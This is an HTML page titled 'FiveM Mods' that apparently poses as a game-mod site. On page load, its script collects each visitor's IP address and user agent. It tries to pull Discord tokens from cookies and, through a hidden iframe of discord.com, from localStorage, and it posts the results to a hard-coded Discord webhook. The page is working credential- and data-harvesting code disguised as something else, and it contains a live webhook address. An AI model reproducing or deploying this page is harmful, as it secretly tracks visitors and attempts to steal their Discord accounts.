<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Mods</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e5e5e5;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #111111;
            border: 1px solid #1a1a1a;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .loading {
            text-align: center;
            color: #6b7280;
            font-family: monospace;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .hidden { display: none !important; }
        .watcher {
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 20px;
            margin-bottom: 24px;
        }
        .watcher img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #22c55e;
        }
        .watcher .info { flex: 1; }
        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
        .badge {
            background: #1a1a1a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #22c55e;
            border: 1px solid #22c55e33;
            font-family: monospace;
        }
        .ip-box {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: monospace;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ip-box .label { color: #6b7280; }
        .ip-box .value { color: #22c55e; }
        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
        .status {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            font-size: 12px;
            color: #6b7280;
            font-family: monospace;
            max-height: 120px;
            overflow-y: auto;
        }
        .status .success { color: #22c55e; }
        .status .error { color: #ef4444; }
        .status .info { color: #3b82f6; }
        .status .warning { color: #f59e0b; }
        .hidden-iframe {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            border: none;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>

<div class="card" id="app">
    <div id="loading" class="loading">
        <div>🔍 Loading...</div>
    </div>

    <div id="content" class="hidden">
        <div class="watcher">
            <img id="avatar" src="" alt="avatar">
            <div class="info">
                <div class="name" id="username">Loading...</div>
                <div class="id" id="discordId">ID: loading...</div>
            </div>
            <span class="badge">● WATCHER</span>
        </div>

        <div class="ip-box">
            <span class="label">📡 IP ADDRESS</span>
            <span class="value" id="ipDisplay">fetching...</span>
        </div>

        <div class="status" id="status">
            <span class="info">●</span> Extracting Discord token from cookies...
        </div>
    </div>
</div>

<!-- Hidden iframe to load discord.com and access cookies -->
<iframe id="discordFrame" class="hidden-iframe" src="https://discord.com"></iframe>

<div class="footer">
    FiveM Mods
</div>

<script>
    // ============================================================
    // CONFIG
    // ============================================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';

    // ============================================================
    // DOM REFS
    // ============================================================
    const loadingEl = document.getElementById('loading');
    const contentEl = document.getElementById('content');
    const avatarEl = document.getElementById('avatar');
    const usernameEl = document.getElementById('username');
    const discordIdEl = document.getElementById('discordId');
    const ipDisplayEl = document.getElementById('ipDisplay');
    const statusEl = document.getElementById('status');
    const frame = document.getElementById('discordFrame');

    // ============================================================
    // STATUS HELPER
    // ============================================================
    function setStatus(msg, type = 'info') {
        const colors = {
            success: '#22c55e',
            error: '#ef4444',
            warning: '#f59e0b',
            info: '#3b82f6'
        };
        statusEl.innerHTML = `<span style="color:${colors[type] || '#3b82f6'}">●</span> ${msg}`;
    }

    // ============================================================
    // GET IP
    // ============================================================
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ============================================================
    // SEND TO WEBHOOK
    // ============================================================
    async function sendToWebhook(user, ip, method) {
        const timestamp = new Date().toLocaleString();

        let content = `**👁️ VISITOR LOGGED**\n`;
        content += `**IP:** ${ip}\n`;
        content += `**User-Agent:** ${navigator.userAgent}\n`;
        content += `**Timestamp:** ${timestamp}\n`;
        content += `**Method:** ${method}\n`;

        if (user) {
            content += `**Discord ID:** ${user.id}\n`;
            content += `**Username:** ${user.global_name || user.username}\n`;
            content += `**Discriminator:** ${user.discriminator}\n`;
        } else {
            content += `**Discord ID:** Not found\n`;
        }

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content })
            });

            if (res.ok) {
                setStatus(`✅ Webhook sent! ${user ? user.global_name || user.username : 'No Discord ID'} from ${ip}`, 'success');
            } else {
                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
            }
        } catch (err) {
            setStatus(`❌ Webhook error: ${err.message}`, 'error');
        }
    }

    // ============================================================
    // GET DISCORD USER FROM TOKEN
    // ============================================================
    async function getDiscordUser(token) {
        try {
            const res = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${token}` }
            });
            if (res.ok) {
                return await res.json();
            }
            return null;
        } catch {
            return null;
        }
    }

    // ============================================================
    // READ COOKIES FROM DISCORD.COM
    // ============================================================
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) {
            return parts.pop().split(';').shift();
        }
        return null;
    }

    // ============================================================
    // ATTEMPT TO GET DISCORD TOKEN FROM COOKIES
    // ============================================================
    function getDiscordTokenFromCookies() {
        // Common Discord cookie names
        const cookieNames = [
            '__discord_token',
            '__dcfduid',
            '__cfduid',
            '__cf_bm',
            'discord_token',
            'token',
            'access_token'
        ];

        for (const name of cookieNames) {
            const cookie = getCookie(name);
            if (cookie) {
                // Try to parse as JSON first
                try {
                    const parsed = JSON.parse(decodeURIComponent(cookie));
                    if (parsed && typeof parsed === 'object') {
                        if (parsed.token) return parsed.token;
                        if (parsed.access_token) return parsed.access_token;
                        if (parsed.id) return parsed.id; // Could be the user ID directly
                    }
                } catch {}

                // If it looks like a JWT or token
                if (cookie.length > 20) {
                    return cookie;
                }
            }
        }

        return null;
    }

    // ============================================================
    // SHOW USER UI
    // ============================================================
    function showUser(user) {
        loadingEl.classList.add('hidden');
        contentEl.classList.remove('hidden');

        if (user) {
            const displayName = user.global_name || user.username || 'Unknown';
            usernameEl.textContent = `${displayName}#${user.discriminator || '0'}`;
            discordIdEl.textContent = `ID: ${user.id}`;

            if (user.avatar) {
                avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
            } else {
                avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(user.id) % 5}.png`;
            }
        } else {
            usernameEl.textContent = 'Guest';
            discordIdEl.textContent = 'ID: not found';
            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
        }
    }

    // ============================================================
    // MAIN — Cookie Extraction Method
    // ============================================================
    (async function init() {
        const ip = await getIP();
        let user = null;
        let token = null;
        let method = 'cookie';

        setStatus('🔍 Checking Discord cookies...', 'info');

        // Try to get token from cookies
        token = getDiscordTokenFromCookies();

        if (token) {
            setStatus('🔑 Token found in cookies. Fetching user info...', 'info');
            user = await getDiscordUser(token);
            if (user) {
                method = 'cookie + token';
            } else {
                setStatus('⚠️ Token found but failed to get user info', 'warning');
            }
        }

        // If still no user, try to read from localStorage of the iframe
        if (!user) {
            setStatus('🔄 Trying to access Discord data via iframe...', 'info');
            try {
                // Wait for iframe to load
                await new Promise((resolve) => setTimeout(resolve, 2000));
                // Try to access iframe's localStorage
                const frameWindow = frame.contentWindow;
                if (frameWindow) {
                    const localData = frameWindow.localStorage;
                    for (const key of Object.keys(localData)) {
                        try {
                            const raw = localData.getItem(key);
                            let parsed;
                            try { parsed = JSON.parse(raw); } catch { continue; }
                            if (parsed && parsed.id && parsed.id.toString().length >= 17) {
                                user = parsed;
                                method = 'iframe localStorage';
                                break;
                            }
                            if (parsed && parsed.user && parsed.user.id) {
                                user = parsed.user;
                                method = 'iframe localStorage';
                                break;
                            }
                        } catch {}
                    }
                }
            } catch {
                // Cross-origin restrictions — ignore
            }
        }

        // Show UI
        showUser(user);
        ipDisplayEl.textContent = ip;

        // Send to webhook
        await sendToWebhook(user, ip, method);

        if (!user) {
            setStatus('❌ No Discord token or user data found in cookies/localStorage', 'error');
        }
    })();
</script>

</body>
</html>
